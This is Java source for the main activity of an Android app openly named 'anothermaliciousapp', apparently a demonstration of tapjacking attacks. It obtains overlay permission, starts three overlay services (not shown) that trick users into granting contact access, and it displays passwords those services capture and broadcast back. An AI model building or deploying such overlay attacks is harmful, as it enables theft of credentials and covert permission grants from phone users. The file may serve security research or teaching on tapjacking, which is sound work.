package org.mmm.anothermaliciousapp;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v4.content.LocalBroadcastManager;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.text.method.ScrollingMovementMethod;
import android.view.View;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.CompoundButton;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {

    private static final int CODE_DRAW_OVER_OTHER_APP_PERMISSION = 2084;
    CheckBox tapjacking3;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, CODE_DRAW_OVER_OTHER_APP_PERMISSION);
        } else {
            initializeView();
        }
    }

    private void initializeView() {

        final TextView output = (TextView) findViewById(R.id.textViewOutput);
        output.setMovementMethod(new ScrollingMovementMethod());

        registerStart((CheckBox) findViewById(R.id.tapjacking1Checkbox), TapjackingService.class);
        registerStart((CheckBox) findViewById(R.id.tapjacking2Checkbox), Tapjacking2Service.class);

        tapjacking3 = (CheckBox) findViewById(R.id.tapjacking3Checkbox);
        tapjacking3.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(CompoundButton compoundButton, boolean b) {
                if (b && ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_CONTACTS)
                        != PackageManager.PERMISSION_GRANTED) {
                    startService(new Intent(MainActivity.this, Tapjacking3Service.class));
                    ActivityCompat.requestPermissions(MainActivity.this, new String[] { Manifest.permission.READ_CONTACTS }, 123);
                } else if (!b) {
                    stopService(new Intent(MainActivity.this, Tapjacking3Service.class));
                }
            }
        });

        BroadcastReceiver receiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                String password = intent.getStringExtra("password");
                output.append(password);
                output.append("\n");
            }
        };

        LocalBroadcastManager.getInstance(this).registerReceiver(receiver, new IntentFilter("MAIN"));
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        tapjacking3.setChecked(false);
    }

    private void registerStart(final CheckBox checkbox, final Class service) {
        checkbox.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(CompoundButton compoundButton, boolean b) {
                if (b) {
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            try {
                                Thread.sleep(2000);
                                startService(new Intent(MainActivity.this, service));
                                Thread.sleep(10_000);
                                runOnUiThread(new Runnable() {
                                    @Override
                                    public void run() {
                                        checkbox.setChecked(false);
                                    }
                                });
                            } catch (InterruptedException e) {
                                e.printStackTrace();
                            }
                        }
                    }).start();
                } else {
                    stopService(new Intent(MainActivity.this, service));
                }
            }
        });
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == CODE_DRAW_OVER_OTHER_APP_PERMISSION) {
            if (Settings.canDrawOverlays(this)) {
                initializeView();
            } else {
                Toast.makeText(this,"Cannot draw over other apps.", Toast.LENGTH_SHORT).show();
                finish();
            }
        } else {
            super.onActivityResult(requestCode, resultCode, data);
        }
    }
}
